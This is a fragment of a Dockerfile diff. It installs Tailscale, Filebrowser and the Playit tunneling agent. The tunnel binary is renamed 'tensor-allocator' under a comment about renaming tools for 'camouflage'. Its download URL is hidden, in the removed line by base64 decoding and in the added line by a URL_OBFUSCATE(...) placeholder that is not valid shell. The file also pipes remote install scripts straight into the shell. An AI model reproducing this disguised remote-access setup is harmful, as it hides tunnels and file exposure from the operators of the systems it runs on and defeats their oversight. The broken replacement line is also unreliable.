@@ -14,7 +14,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 # Install Tailscale, Filebrowser, and Playit
 RUN curl -fsSL https://tailscale.com/install.sh | sh && \
     curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
-    curl -fsSL $(echo 'aHR0cHM6Ly9naXRodWIuY29tL3BsYXlpdC1jbG91ZC9wbGF5aXQtYWdlbnQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL3BsYXlpdC1saW51eC1hbWQ2NA==' | base64 -d) -o /usr/bin/tensor-allocator && \
+    curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator && \
     chmod +x /usr/bin/tensor-allocator
 
 # Rename tools for camouflage
